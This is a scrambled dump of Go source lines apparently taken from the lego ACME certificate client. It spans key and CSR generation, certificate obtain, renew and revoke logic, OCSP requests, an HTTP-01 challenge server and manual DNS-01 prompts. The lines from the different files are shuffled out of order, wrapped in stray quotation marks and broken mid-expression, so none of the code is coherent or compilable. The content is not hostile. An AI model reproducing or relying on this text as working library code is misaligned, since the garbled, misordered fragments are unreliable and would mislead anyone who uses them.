OCSPServerFailed = ocsp.ServerFailed
func PEMBlock(data interface{}) 
"rsa.PrivateKey, expiration time.Time, domain string, extensions []pkix.Extension) ([]byte, error) {"
"""fmt"""
func generateDerCert(privateKey 
// Duplicate
import (
"""math/big"""
"return pemBlock, nil"
case EC384:
"""crypto/ecdsa"""
switch keyBlock.Type {
switch key := data.(type) {
"Subject:  pkix.Name{CommonName: domain},"
func ExtractDomains(cert 
x509.Certificate) []string {
"ExtraExtensions:       extensions,"
if pemBlock == nil {
func ParsePEMBundle(bundle []byte) ([]
"x509.CertificateRequest, error) {"
"case ""RSA PRIVATE KEY"":"
"EC256   = KeyType(""P256"")"
"return rsa.GenerateKey(rand.Reader, 4096)"
"pem.Block, error) {"
"domains = append(domains, sanName)"
"rsa.PrivateKey, domain string, extensions []pkix.Extension) ([]byte, error) {"
OCSPRevoked = ocsp.Revoked
case RSA4096:
case RSA8192:
return x509.ParsePKCS1PrivateKey(keyBlock.Bytes)
"case ""EC PRIVATE KEY"":"
case DERCertificateBytes:
"DNSNames: san,"
"RSA8192 = KeyType(""8192"")"
Subject: pkix.Name{
domains := []string{csr.Subject.CommonName}
// Name is unique
// KeyType represents the key algo as well as the key size or curve to use.
// loop over the SubjectAltName DNS names
"""time"""
"return nil, fmt.Errorf(""PEM block is not a certificate request"")"
x509.CertificateRequest:
"return ecdsa.GenerateKey(elliptic.P384(), rand.Reader)"
"""crypto/rsa"""
"template, privateKey)"
"SerialNumber: serialNumber,"
"keyBytes, _ := x509.MarshalECPrivateKey(key)"
"domains = append(domains, sanDomain)"
"return x509.CreateCertificate(rand.Reader, "
// Check for SAN certificate
"return nil, err"
template := x509.Certificate{
"ocspMustStapleFeature  = []byte{0x30, 0x03, 0x02, 0x01, 0x05}"
// OCSPRevoked means that the certificate has been deliberately revoked.
"EC384   = KeyType(""P384"")"
"BasicConstraintsValid: true,"
template := x509.CertificateRequest{
"""encoding/pem"""
"""crypto/rand"""
"return rsa.GenerateKey(rand.Reader, 2048)"
// ParsePEMBundle parses a certificate bundle from top to bottom and returns
ecdsa.PrivateKey:
OCSPGood = ocsp.Good
x509.Certificate
if len(certificates) == 0 {
return false
"""crypto"""
pem.Block
"if certDERBlock.Type == ""CERTIFICATE"" {"
// Constants for all key types we support.
type DERCertificateBytes []byte
return x509.ParseCertificate(pemBlock.Bytes)
x509.CertificateRequest) []string {
"return rsa.GenerateKey(rand.Reader, 8192)"
pem.Block {
"for _, sanName := range csr.DNSNames {"
"keyBlock, _ := pem.Decode(key)"
"return nil, errors.New(""no certificates were found while parsing the bundle"")"
"return x509.CreateCertificateRequest(rand.Reader, "
if mustStaple {
var certificates []
"NotBefore: time.Now(),"
"x509.Certificate, error) {"
func ParsePEMCertificate(cert []byte) (
return x509.ParseCertificateRequest(pemBlock.Bytes)
package certcrypto
// a slice of x509 certificates. This function will error if no certificates are found.
"derBytes, err := generateDerCert(privateKey, time.Time{}, domain, extensions)"
"func GenerateCSR(privateKey crypto.PrivateKey, domain string, san []string, mustStaple bool) ([]byte, error) {"
var (
func GeneratePemCert(privateKey 
"for _, existingName := range domains {"
"if containsSAN(domains, sanName) {"
const (
"""crypto/x509/pkix"""
Fatal(args ...interface{})
// Logger is an optional custom logger.
func Println(args ...interface{}) {
import (
// Fatal writes a log entry.
func Fatal(args ...interface{}) {
"""log"""
"Printf(""[INFO] """
Println(args ...interface{})
"Fatalf(format string, args ...interface{})"
// Fatalf writes a log entry.
type StdLogger interface {
"""os"""
"func Fatalf(format string, args ...interface{}) {"
"Logger.Fatalf(format, args...)"
// Warnf writes a log entry.
"func Printf(format string, args ...interface{}) {"
// Print writes a log entry.
// Infof writes a log entry.
// Println writes a log entry.
"// It uses Logger if not nil, otherwise it uses the default log.Logger."
Print(args ...interface{})
"Printf(format string, args ...interface{})"
"var Logger StdLogger = log.New(os.Stdout, """", log.LstdFlags)"
Logger.Fatal(args...)
Fatalln(args ...interface{})
Logger.Print(args...)
// Printf writes a log entry.
"Printf(""[WARN] """
// StdLogger interface for Standard Logger.
func Print(args ...interface{}) {
"func Warnf(format string, args ...interface{}) {"
"format, args...)"
"func Infof(format string, args ...interface{}) {"
Logger.Println(args...)
"Logger.Printf(format, args...)"
package log
case err := <-errc:
time.Sleep(delay)
 i < len(order.Authorizations)
if c.core.Authorizations.Deactivate(auth) != nil {
import (
}(authzURL)
"responses = append(responses, res)"
failures := make(obtainError)
// but using 20 as value doesn't work but 18 do
var responses []acme.Authorization
failures[err.Domain] = err.Error
"for _, authzURL := range order.Authorizations {"
"// From the documentation the limitation is 20 requests per second,"
select {
close(resc)
"// even if empty, they become non-nil error values"
"resc, errc := make(chan acme.Authorization), make(chan domainError)"
"""github.com/go-acme/lego/v3/acme"""
"errc <- domainError{Domain: authz.Identifier.Value, Error: err}"
for i := 0
"return responses, failures"
func (c 
"Certifier) getAuthorizations(order acme.ExtendedOrder) ([]acme.Authorization, error) {"
"authz, err := c.core.Authorizations.Get(authzURL)"
overallRequestLimit = 18
"for i, auth := range order.Authorizations {"
"""github.com/go-acme/lego/v3/log"""
close(errc)
delay := time.Second / overallRequestLimit
go func(authzURL string) {
// overallRequestLimit is the overall number of request per second
case res := <-resc:
"// limited on the ""new-reg"", ""new-authz"" and ""new-cert"" endpoints."
return
// be careful to not return an empty failures map
"return responses, nil"
"log.Infof(""Unable to deactivate the authorization: %s"", auth)"
package certificate
"log.Infof(""[%s] AuthURL: %s"", order.Identifiers[i].Value, auth)"
if len(failures) > 0 {
"""time"""
if err != nil {
Certifier) deactivateAuthorizations(order acme.ExtendedOrder) {
resc <- authz
"for _, auth := range order.Authorizations {"
const (
"""fmt"""
func (e obtainError) Error() string {
for domain := range e {
import (
"buffer := bytes.NewBufferString(""acme: Error -> One or more domains had a problem:"
sort.Strings(domains)
Domain string
// obtainError is returned when there are specific errors available per domain.
type obtainError map[string]error
"for _, domain := range domains {"
"n"", domain, e[domain]))"
"""bytes"""
Error  error
type domainError struct {
"buffer.WriteString(fmt.Sprintf(""[%s] %s"
var domains []string
return buffer.String()
"domains = append(domains, domain)"
package certificate
"""sort"""
"CertStableURL:     url,"
section-7
"Certificate:       cert,"
"// If there's no OCSP server listed in the leaf cert, there's nothing to do."
"// if the certificate is available right away, short cut!"
failures := make(obtainError)
type resolver interface {
// The returned []byte can be passed directly into the OCSPStaple property of a tls.Certificate.
"ocsp.Response, error) {"
"""io/ioutil"""
var err error
return c.Obtain(query)
"Resource, error) {"
"// The domains are inferred from the CommonName and SubjectAltNames, if any."
"log.Infof(""[%s] acme: Obtaining SAN certificate"", strings.Join(domains, "", ""))"
"""github.com/go-acme/lego/v3/platform/wait"""
if len(request.Domains) == 0 {
if cert != nil {
"// PrivateKey, Certificate and IssuerCertificate are all"
default:
Certifier) Obtain(request ObtainRequest) (
"Certifier) Renew(certRes Resource, bundle, mustStaple bool) ("
KeyType certcrypto.KeyType
// and use that if it's defined.
"PrivateKey: privateKey,"
// We always need to request a new certificate to renew.
"""crypto/x509"""
"return false, nil"
"""bytes"""
core     
if len(issuedCert.OCSPServer) == 0 {
"return valid, err"
"""github.com/go-acme/lego/v3/log"""
"sanitizedDomains = append(sanitizedDomains, sanitizedDomain)"
"""golang.org/x/net/idna"""
"// SRV CRT -> CA. We need to pull the leaf and issuer certs out of it,"
case acme.StatusValid:
return sanitizedDomains
"return false, errW"
"resp, err := c.core.HTTPClient.Post(issuedCert.OCSPServer[0], ""application/ocsp-request"", bytes.NewReader(ocspReq))"
timeLeft := x509Cert.NotAfter.Sub(time.Now().UTC())
"return ocspResBytes, ocspRes, nil"
"err = wait.For(""certificate"", timeout, timeout/60, func() (bool, error) {"
"for _, auth := range authz {"
Resource{
if len(certRes.CSR) > 0 {
revokeMsg := acme.RevokeCertMessage{
"Domains:    certcrypto.ExtractDomains(x509Cert),"
issuedCert := certificates[0]
"return nil, nil, errors.New(""no issuing certificate URL"")"
type Resource struct {
case acme.StatusInvalid:
"""errors"""
"// If bundle is true, the []byte contains both the issuer certificate and your issued certificate as a bundle."
options  CertifierOptions
"log.Infof(""[%s] acme: Obtaining bundled SAN certificate given a CSR"", strings.Join(domains, "", ""))"
"return nil, errR"
// Get attempts to fetch the certificate at the supplied URL.
// Please be aware that this function will return a new certificate in ANY case that is not an error.
"""strings"""
// Determine certificate name(s) based on the authorization resources
"json:""domain"""
"order, err := c.core.Orders.New(domains)"
"csr, err := certcrypto.GenerateCSR(privateKey, commonName, san, mustStaple)"
certRes.IssuerCertificate = issuer
"return nil, errP"
"// If one domain in the list fails, the whole certificate will fail."
"return done, nil"
 time.Second
"""golang.org/x/crypto/ocsp"""
if errW != nil {
cert.CSR = certcrypto.PEMEncode(
"// If bundle is true, the certificate will be bundled with the issuer's cert."
if errP != nil {
"""encoding/base64"""
"// If the bundle only contains the issued certificate,"
certRes.CertURL = order.Certificate
"return certRes, nil"
// TODO: should the CSR be customizable
issuerCert := certificates[1]
san := []string{commonName}
// Parse the returned cert bundle so that we can grab the domain from the common name.
// Resource represents a CA issued certificate.
"san = append(san, auth.Value)"
"cert, issuer, err := c.core.Certificates.Get(url, bundle)"
certRes.CertStableURL = order.Certificate
// because it would still be a non-nil error value
if auth.Value != commonName {
"// TODO: build fallback. If this fails, check the remaining array entries."
defer resp.Body.Close()
resolver resolver
PrivateKey crypto.PrivateKey
"Certifier) ObtainForCSR(csr x509.CertificateRequest, bundle bool) ("
// start with the common name
"return c.getForCSR(domains, order, bundle, csr, certcrypto.PEMEncode(privateKey))"
"MustStaple: mustStaple,"
domains := sanitizeDomain(request.Domains)
// all other domains are added using the Subject Alternate Names extension.
"// Do not return an empty failures map,"
"Resource, bundle bool) (bool, error) {"
"// If the renewal process succeeds, the new certificate will ge returned in a new CertResource."
"resolver: resolver,"
"options:  options,"
domains := certcrypto.ExtractDomainsCSR(
//   Clients SHOULD NOT make any assumptions about the sort order of
if c.options.Timeout <= 0 {
"return nil, fmt.Errorf(""[%s] Certificate bundle starts with a CA certificate"", certRes.Domain)"
// checkResponse checks to see if the certificate is ready and a link is contained in the response.
"return fmt.Errorf(""certificate bundle starts with a CA certificate"")"
"ok, errR := c.checkResponse(respOrder, certRes, bundle)"
// Renew takes a Resource and tries to renew the certificate.
return c.core.Certificates.Revoke(revokeMsg)
"CertURL:    respOrder.Certificate,"
"return true, nil"
"// If the []byte and/or ocsp.Response return values are nil, the OCSP status may be assumed OCSPUnknown."
if err != nil 
"sanitizedDomain, err := idna.ToASCII(domain)"
func NewCertifier(core 
"log.Infof(""[%s] acme: Validations succeeded"
"log.Infof(""[%s] acme: Obtaining SAN certificate given a CSR"", strings.Join(domains, "", ""))"
//   MUST be encoded according to the rules in Section 7 of [RFC5280].
"Certifier) getForCSR(domains []string, order acme.ExtendedOrder, bundle bool, csr []byte, privateKeyPem []byte) ("
var privateKey crypto.PrivateKey
"cert, issuer, err := c.core.Certificates.Get(order.Certificate, bundle)"
"csr, errP := certcrypto.PemDecodeTox509CSR(certRes.CSR)"
return err
// The domain name MUST be encoded
} else {
func sanitizeDomain(domains []string) []string {
// depending on the options supplied to create it.
"Bundle:     bundle,"
"cert, err := c.getForCSR(domains, order, bundle, csr.Raw, nil)"
"""github.com/go-acme/lego/v3/certcrypto"""
// If this parameter is non-nil it will be used instead of generating a new one.
"// If so, loads it into certRes and returns true."
"authz, err := c.getAuthorizations(order)"
"certificates, err := certcrypto.ParsePEMBundle(cert)"
// For private key reuse the PrivateKey property of the passed in Resource should be non-nil.
if len(issuedCert.IssuingCertificateURL) == 0 {
"ocspReq, err := ocsp.CreateRequest(issuedCert, issuerCert, nil)"
// already PEM encoded and can be directly written to disk.
"json:""certStableUrl"""
if errR != nil {
"""github.com/go-acme/lego/v3/acme/api"""
// ObtainForCSR tries to obtain a certificate matching the CSR passed into it.
timeout = 30 
// The certRes input should already have the Domain (common name) field populated.
"json:""-"""
if err != nil {
// figure out what domains it concerns
"privateKey, err = certcrypto.ParsePEMPrivateKey(certRes.PrivateKey)"
section-7.1.4
"""net/http"""
// The returned Resource will not have the PrivateKey and CSR fields populated as these will not be available.
certRes := 
Timeout time.Duration
"issuerCert, errC := x509.ParseCertificate(issuerBytes)"
// Certifier A service to obtain/renew/revoke certificates.
"certificates, err := certcrypto.ParsePEMBundle(certRes.Certificate)"
"cert, err := c.getForOrder(domains, order, request.Bundle, request.PrivateKey, request.MustStaple)"
"""fmt"""
return c.ObtainForCSR(
"for _, domain := range domains {"
"Certifier) Get(url string, bundle bool) ("
timeout := c.options.Timeout
"respOrder, err := c.core.Orders.UpdateForCSR(order.Finalize, csr)"
"return certRes, err"
import (
"func checkOrderStatus(order acme.Order) (bool, error) {"
// Obtain tries to obtain a single certificate using all domains passed into it.
Domain            string 
// The input may be a bundle or a single certificate.
Domains    []string
type ObtainRequest struct {
// If the server does not provide us with a new cert on a GET request to the CertURL
api.Core
"// Do not return an empty failures map, because"
"done, errW := c.checkResponse(ord, certRes, bundle)"
 !valid {
PrivateKey        []byte 
"// If any challenge fails, return. Do not generate partial SAN certificates."
if bundle {
"ord, errW := c.core.Orders.Get(order.Location)"
if ok {
if respOrder.Status == acme.StatusValid {
"certificates, err := certcrypto.ParsePEMBundle(bundle)"
"resp, errC := c.core.HTTPClient.Get(issuedCert.IssuingCertificateURL[0])"
section-7.4
"x509Certs, err := certcrypto.ParsePEMBundle(cert)"
// If you do not want that you can supply your own private key in the privateKey parameter.
Certifier) Revoke(cert []byte) error {
CertStableURL     string 
"IssuerCertificate: issuer,"
if x509Cert.IsCA {
func (c 
"log.Infof(""[%s] Server responded with a certificate."", certRes.Domain)"
// https://tools.ietf.org/html/draft-ietf-acme-acme-12
// Input certificate is PEM encoded.
"json:""certUrl"""
"api.Core, resolver resolver, options CertifierOptions) "
"for _, auth := range order.Identifiers {"
Solve(authorizations []acme.Authorization) error
" requesting certificates"", strings.Join(domains, "", ""))"
"// GetOCSP takes a PEM encoded cert or cert bundle returning the raw OCSP response,"
Certificate       []byte 
"privateKey, err = certcrypto.GeneratePrivateKey(c.options.KeyType)"
if request.Bundle {
query := ObtainRequest{
"Domain:            x509Certs[0].Subject.CommonName,"
"return nil, errors.New(""no domains to obtain a certificate for"")"
x509Cert := certificates[0]
"}, nil"
"core:     core,"
"""github.com/go-acme/lego/v3/challenge"""
MustStaple bool
var sanitizedDomains []string
csr)
"Certifier) getForOrder(domains []string, order acme.ExtendedOrder, bundle bool, privateKey crypto.PrivateKey, mustStaple bool) ("
type CertifierOptions struct {
"csr, bundle)"
"return cert, failures"
// says:
// which should always be the first two certificates.
"issuerBytes, errC := ioutil.ReadAll(http.MaxBytesReader(nil, resp.Body, maxBodySize))"
"return cert, nil"
// this function will try to get the issuer certificate from the IssuingCertificateURL in the certificate.
if len(failures) > 0 {
"""time"""
"PrivateKey: privateKeyPem,"
// maxBodySize is the maximum size of body that we will read.
//   object.
"return false, order.Error"
return 
"// If bundle is true, the Certificate field in the returned Resource includes the issuer certificate."
"//   ""identifiers"" or ""authorizations"" elements in the returned order"
"ocspRes, err := ocsp.ParseResponse(ocspResBytes, issuerCert)"
"Certificate: base64.RawURLEncoding.EncodeToString(x509Cert.Raw),"
"// ACME draft Section 7.4 ""Applying for Certificate Issuance"""
"return false, err"
"return nil, err"
IssuerCertificate []byte 
// Finally kick off the OCSP request.
"Domain:     commonName,"
"CertURL:           url,"
if errC != nil {
// NewCertifier creates a Certifier.
if certRes.PrivateKey != nil {
"//   in the form in which it would appear in a certificate.  That is, it"
failures[challenge.GetTargetedDomain(auth)] = err
"return nil, nil, errC"
Certifier {
Certifier{
// The private key for this CSR is not required.
if privateKey == nil {
"Certifier) checkResponse(order acme.Order, certRes "
// This is just meant to be informal for the user.
"log.Infof(""[%s] acme: Obtaining bundled SAN certificate"", strings.Join(domains, "", ""))"
if len(certificates) == 1 {
"log.Infof(""[%s] acme: Trying renewal with %d hours remaining"", certRes.Domain, int(timeLeft.Hours()))"
type Certifier struct {
"// The first domain in domains is used for the CommonName field of the certificate,"
// We want it ordered right SRV CRT -> CA
CertURL           string 
// https://tools.ietf.org/html/draft-ietf-acme-acme-16
err = c.resolver.Solve(authz)
"Certifier) GetOCSP(bundle []byte) ([]byte, "
// Revoke takes a PEM encoded certificate or bundle and tries to revoke it at the CA.
"// Start by checking to see if the certificate was based off a CSR,"
"return nil, nil, errors.New(""no OCSP server specified in cert"")"
Bundle     bool
"""crypto"""
// Decode it here as we may need the decoded cert later on in the renewal process.
// https://tools.ietf.org/html/rfc5280
// This function will never return a partial certificate.
// The URL is the same as what would normally be supplied at the Resource's CertURL.
"""github.com/go-acme/lego/v3/acme"""
"// the parsed response, and an error, if any."
// it would still be a non-nil error value
// ObtainRequest The request to obtain certificate.
// A new private key is generated for every invocation of the function Obtain.
"// And if we have only one certificate so far, we need to get the issuer cert."
switch order.Status {
"certificates = append(certificates, issuerCert)"
"return nil, nil, err"
// We expect the certificate slice to be ordered downwards the chain.
const maxBodySize = 1024 
"log.Infof(""skip domain %q: unable to sanitize (punnycode): %v"", domain, err)"
// this function will start a new-cert flow where a new certificate gets generated.
certRes.Certificate = cert
// Insert it into the slice on position 0
"ocspResBytes, err := ioutil.ReadAll(http.MaxBytesReader(nil, resp.Body, maxBodySize))"
package certificate
"// Certificate may be a certificate bundle,"
c.deactivateAuthorizations(order)
"// If the cert is not yet ready, it returns false."
"valid, err := checkOrderStatus(order)"
// Add the CSR to the certificate so that it can be used for renewals.
 1024
CSR               []byte 
commonName := domains[0]
"return """
"""fmt"""
"// HTTP01 is the ""http-01"" ACME challenge https://tools.ietf.org/html/draft-ietf-acme-acme-16"
import (
"HTTP01 = Type(""http-01"")"
"// TLSALPN01 is the ""tls-alpn-01"" ACME challenge https://tools.ietf.org/html/draft-ietf-acme-tls-alpn-05"
 authz.Identifier.Value
"for _, chlg := range authz.Challenges {"
"return acme.Challenge{}, fmt.Errorf(""[%s] acme: unable to find challenge %s"", GetTargetedDomain(authz), chlgType)"
"DNS01 = Type(""dns-01"")"
return authz.Identifier.Value
func GetTargetedDomain(authz acme.Authorization) string {
type Type string
// Note: ChallengePath returns the URL path to fulfill this challenge
if authz.Wildcard {
package challenge
"func FindChallenge(chlgType Type, authz acme.Authorization) (acme.Challenge, error) {"
"// DNS01 is the ""dns-01"" ACME challenge https://tools.ietf.org/html/draft-ietf-acme-acme-16"
"return chlg, nil"
"""github.com/go-acme/lego/v3/acme"""
"TLSALPN01 = Type(""tls-alpn-01"")"
return string(t)
// Note: GetRecord returns a DNS record which will fulfill this challenge
func (t Type) String() string {
section-8.3
section-8.4
if chlg.Type == string(chlgType) {
// Type is a string that identifies a particular challenge type and version of ACME challenge.
const (
type ProviderTimeout interface {
"Present(domain, token, keyAuth string) error"
// provider. Present presents the solution to a challenge available to
// Provider enables implementing a custom challenge
"CleanUp(domain, token, keyAuth string) error"
// The default values used for timeout and interval are 60 seconds and
// package. The interval value is the time between checks.
Provider
// ProviderTimeout allows for implementing a
"import ""time"""
package challenge
// be solved. CleanUp will be called by the challenge if Present ends
"// Provider provides a Timeout method, then the return values"
// in a non-error state.
// Provider where an unusually long timeout is required when
// checking for DNS record propagation. If an implementor of a
type Provider interface {
// 2 seconds respectively. These are used when no Timeout method is
"// waiting for an ACME challenge to be satisfied, such as when"
// of the Timeout method will be used when appropriate by the acme
"Timeout() (timeout, interval time.Duration)"
// defined for the Provider.
"// - ""Forwarded"" will look for a Forwarded header, and inspect it according to https://tools.ietf.org/html/rfc7239"
listener net.Listener
ChallengePath(token)
var err error
"_, err := w.Write([]byte(keyAuth))"
default:
"w.Header().Add(""Content-Type"", ""text/plain"")"
// Present starts a web server and makes the token available at 
"ProviderServer{iface: iface, port: port, matcher: "
 for web requests.
return nil
"// and RFC7239 has standadized a new header named ""Forwarded"" (with slightly different semantics)."
"""github.com/go-acme/lego/v3/log"""
// NewProviderServer creates a new ProviderServer on the selected interface and port.
"// Apache and NGINX have traditionally moved the original Host header into a new header named ""X-Forwarded-Host""."
// - any other value will check the header value with the same name
 challenge
hostMatcher{}}
iface    string
"""net/textproto"""
"case """", ""Host"":"
// It may be instantiated without using the NewProviderServer function if
"""strings"""
" !strings.Contains(err.Error(), ""use of closed network connection"") {"
"// we don't want any lingering connections, so disable KeepAlives."
"case ""Forwarded"":"
"ProviderServer) CleanUp(domain, token, keyAuth string) error {"
s.matcher = arbitraryMatcher(h)
port     string
if err != nil 
// you want only to use the default values.
"// When the server runs behind a proxy server, this is not the correct place to look at"
"return net.JoinHostPort(s.iface, s.port)"
} else {
s.matcher = 
"ProviderServer) serve(domain, token, keyAuth string) {"
log.Println(err)
if err != nil {
// Once httpServer is shut down
"""net/http"""
"ProviderServer) Present(domain, token, keyAuth string) error {"
path := ChallengePath(token)
"mux.HandleFunc(path, func(w http.ResponseWriter, r "
"""fmt"""
forwardedMatcher{}
matcher  domainMatcher
import (
s.listener.Close()
// Other webservers might use different names
ProviderServer) SetProxyHeader(headerName string) {
http.Server{Handler: mux}
s.done = make(chan bool)
"""net"""
ProviderServer) GetAddress() string {
 h {
"go s.serve(domain, token, keyAuth)"
if s.listener == nil {
// The exact behavior depends on the value of headerName:
"// - """" (the empty string) and ""Host"" will restore the default and only check the Host header"
"_, err := w.Write([]byte(""TEST""))"
err := httpServer.Serve(s.listener)
// SetProxyHeader changes the validation of incoming requests.
// Setting iface and / or port to an empty string will make the server fall back to
"return fmt.Errorf(""could not start HTTP server for challenge -> %v"", err)"
return 
package http01
ProviderServer {
http-01
"log.Infof(""[%s] Served key authentication"", domain)"
type ProviderServer struct {
httpServer.SetKeepAlivesEnabled(false)
"// the ""any"" interface and port 80 respectively."
" s.matcher.matches(r, domain) {"
s.done <- true
<-s.done
"port = ""80"""
// CleanUp closes the HTTP server and removes the token from 
hostMatcher{}
mux := http.NewServeMux()
"log.Warnf(""Received request for domain %s with method %s but the domain did not match any challenge. Please ensure your are passing the %s header properly."", r.Host, r.Method, s.matcher.name())"
http.Request) {
if r.Method == http.MethodGet 
"http.Error(w, err.Error(), http.StatusInternalServerError)"
func (s 
"if port == """" {"
// ProviderServer implements ChallengeProvider for 
"func NewProviderServer(iface, port string) "
return
"s.listener, err = net.Listen(""tcp"", s.GetAddress())"
done     chan bool
"// By default, s matches the ""Host"" header value to the domain name."
"// We only respond with the keyAuth, when we're receiving a GET requests with"
httpServer := 
switch h := textproto.CanonicalMIMEHeaderKey(headerName)
// The incoming request must will be validated to prevent DNS rebind attacks.
"// the ""Host"" header matching the domain (the latter is configurable though SetProxyHeader)."
"""fmt"""
chlng.KeyAuthorization = keyAuth
http-01
"return c.validate(c.core, domain, chlng)"
func NewChallenge(core 
import (
validate ValidateFunc
"err := c.provider.CleanUp(authz.Identifier.Value, chlng.Token, keyAuth)"
"api.Core, validate ValidateFunc, provider challenge.Provider) "
api.Core
"err = c.provider.Present(authz.Identifier.Value, chlng.Token, keyAuth)"
"provider: provider,"
Challenge {
// ChallengePath returns the URL path for the 
type ValidateFunc func(core 
// Generate the Key Authorization for the challenge
domain := challenge.GetTargetedDomain(authz)
Challenge) Solve(authz acme.Authorization) error {
"""github.com/go-acme/lego/v3/acme"""
Challenge) SetProvider(provider challenge.Provider) {
defer func() {
func (c 
c.provider = provider
"api.Core, domain string, chlng acme.Challenge) error"
core     
"""github.com/go-acme/lego/v3/log"""
func ChallengePath(token string) string {
return err
"log.Warnf(""[%s] acme: error cleaning up: %v"", domain, err)"
"core:     core,"
 challenge
 token
"""github.com/go-acme/lego/v3/challenge"""
"return fmt.Errorf(""[%s] acme: error presenting token: %v"", domain, err)"
"keyAuth, err := c.core.GetKeyAuthorization(chlng.Token)"
type Challenge struct {
"validate: validate,"
"log.Infof(""[%s] acme: Trying to solve HTTP-01"", domain)"
"""github.com/go-acme/lego/v3/acme/api"""
"chlng, err := challenge.FindChallenge(challenge.HTTP01, authz)"
if err != nil {
provider challenge.Provider
"return ""/.well-known/acme-challenge/"" "
Challenge{
return 
package http01
"if r == '""' {"
"case r == '""': // start of quoted-string"
func (m arbitraryMatcher) name() string {
case r == '=': // end of token
// RFC7239 has standardized the different forwarding headers into a single header named Forwarded.
"//   X-Header: a, b"
"host := fwds[0][""host""]"
default:
// meaning that
"key = strings.ToLower(strings.TrimFunc(s[pos:i], isWS))"
// This is primarily used to create meaningful error messages.
// in the HTTP request coming from the ACME validation servers.
cur = make(map[string]string)
forwardedMatcher) matches(r 
// hostMatcher checks whether the specified (
"return nil, fmt.Errorf(""invalid token character at pos %d: %c"", i, r)"
"key = """""
"val := """""
"// Use arbitraryMatcher(""X-Forwarded-Host"") in this case,"
"return strings.HasPrefix(host, domain)"
return string(m)
"func parseForwardedHeader(s string) (elements []map[string]string, err error) {"
"i = skipWS(s, i)"
inquote = false
"""strings"""
if len(fwds) == 0 {
type arbitraryMatcher string
if len(cur) > 0 {
func isWS(r rune) bool {
// All matcher implementations (explicitly not excluding arbitraryMatcher!)
r := rune(s[i])
"if val == """" {"
'0' <= r 
"return nil, fmt.Errorf(""unterminated quoted-string at pos %d"", len(s))"
"return strings.ContainsRune("" "
"return strings.HasPrefix(r.Host, domain)"
type hostMatcher struct{}
"return strings.ContainsRune(""!"
"return elements, nil"
// or the appropriate header name for other proxy servers.
// or when it operates behind a transparent proxy.
': // end of forwarded-pair
 r <= 'z' 
case tchar(r) 
// A domainMatcher tries to match a domain (the one we're requesting a certificate for)
// The most simple check involves finding the domain in the HTTP Host header
hostMatcher) name() string {
continue
 r <= 'Z'
// See https://tools.ietf.org/html/rfc7239 for details.
inquote := false
cur[key] = s[pos:i]
"n"", r)"
"key := """""
 isWS(r): // valid token character or whitespace
// where the webserver matches incoming requests to a list of domain the server acts authoritative for.
"// Use it, when the http01.ProviderServer is directly reachable from the internet,"
name() string
"http.Request, domain string) bool"
val = s[pos:]
cur := make(map[string]string)
if err != nil {
"""net/http"""
""", r) "
// this is what hostMatcher does.
// when the http01.ProviderServer operates behind a RFC7239 compatible proxy.
// is equal to
"""fmt"""
"return ""Host"""
"return strings.HasPrefix(r.Header.Get(m.name()), domain)"
if pos < len(s) {
type forwardedMatcher struct{}
"if key != """" {"
"func skipWS(s string, i int) int {"
import (
matches(request 
net/http).Request.Host starts with a domain name.
"// This step is part of DNS rebind attack prevention,"
"if key == """" {"
cur[key] = val
net/http.Request).Header value starts with a domain name.
pos = i
func (m arbitraryMatcher) matches(r 
// hostMatcher checks whether (
 r <= '9' 
for i := 0
val = s[pos:i]
//   X-Header: b
if inquote {
case r == '
func tchar(r rune) bool {
forwardedMatcher) name() string {
"return ""Forwarded"""
"case r == ',': // end of forwarded-element"
"return nil, fmt.Errorf(""unexpected quoted string as pos %d"", i)"
// have in common that they only match against the first value in such lists.
// name returns the header name used in the check.
package http01
'A' <= r 
switch {
return i
"http.Request, domain string) bool {"
"// In many (reverse) proxy setups, Apache and NGINX traditionally move the Host header to a new header named X-Forwarded-Host."
type domainMatcher interface {
"elements = append(elements, cur)"
"val = """""
pos := 0
1])) {
// parsing requires some form of state machine
"// Note: RFC7239 also reminds us, ""that an HTTP list [...] may be split over multiple header fields"" (section 7.1),"
"fwds, err := parseForwardedHeader(r.Header.Get(m.name()))"
// https://tools.ietf.org/html/rfc7239
return false
//   X-Header: a
func (m 
 i < l
inquote = true
pos = i 
for isWS(rune(s[i
// matches checks whether the request is valid for the given domain.
'a' <= r 
hostMatcher) matches(r 
"// The header value has a different format, so you should use forwardedMatcher"
l := len(s)
"// forwardedMatcher checks whether the Forwarded header contains a ""host"" element starting with a domain name."
"DNSProviderManual, error) {"
"authZone, err := FindZoneByFqdn(fqdn)"
// Returns the interval between each iteration.
"""fmt"""
// DNSProviderManual is an implementation of the ChallengeProvider interface
import (
dnsTemplate = 
const (
"DNSProviderManual{}, nil"
"_, err = bufio.NewReader(os.Stdin).ReadBytes('"
func NewDNSProviderManual() (
"DNSProviderManual) Present(domain, token, keyAuth string) error {"
"n"", authZone)"
// CleanUp prints instructions for manually removing the TXT record
// NewDNSProviderManual returns a DNSProviderManual instance.
"""os"""
"%s %d IN TXT ""%s"""
"fmt.Printf(""lego: Press 'Enter' when you are done"
return nil
"DNSProviderManual) CleanUp(domain, token, keyAuth string) error {"
// Present prints instructions for manually creating the TXT record
"fmt.Printf(""lego: Please create the following TXT record in your %s zone:"
"""bufio"""
"fqdn, value := GetRecord(domain, keyAuth)"
package dns01
fmt.Printf(dnsTemplate
return err
"n"", fqdn, DefaultTTL, ""..."")"
func (d 
"n"", fqdn, DefaultTTL, value)"
"fqdn, _ := GetRecord(domain, keyAuth)"
"""time"""
if err != nil {
return DefaultPropagationTimeout
type DNSProviderManual struct{}
return 
"fmt.Printf(""lego: You can now remove this TXT record from your %s zone:"
DNSProviderManual) Sequential() time.Duration {
func (
// Sequential All DNS challenges for this provider will be resolved sequentially.
func AddPreCheck(preCheck PreCheckFunc) ChallengeOption {
chlg.preCheck.requireCompletePropagation = false
"return false, errors.New(""invalid preCheck: preCheck is nil"")"
"""fmt"""
"return false, err"
if !found {
chlg.preCheck.checkFunc = wrap
"r, err := dnsQuery(fqdn, dns.TypeTXT, []string{net.JoinHostPort(ns, ""53"")}, false)"
import (
Challenge) error {
if !p.requireCompletePropagation {
"chlg.preCheck.checkFunc = func(_, fqdn, value string, _ PreCheckFunc) (bool, error) {"
// checkAuthoritativeNss queries each of the given nameservers for the expected TXT record.
func DisableCompletePropagationRequirement() ChallengeOption {
"type PreCheckFunc func(fqdn, value string) (bool, error)"
check := preCheck
// WrapPreCheckFunc wraps a PreCheckFunc in order to do extra operations before or after
 ok {
var found bool
if r.Rcode != dns.RcodeSuccess {
if r.Rcode == dns.RcodeSuccess {
"// the main check, put it in a loop, etc."
"r, err := dnsQuery(fqdn, dns.TypeTXT, recursiveNameservers, true)"
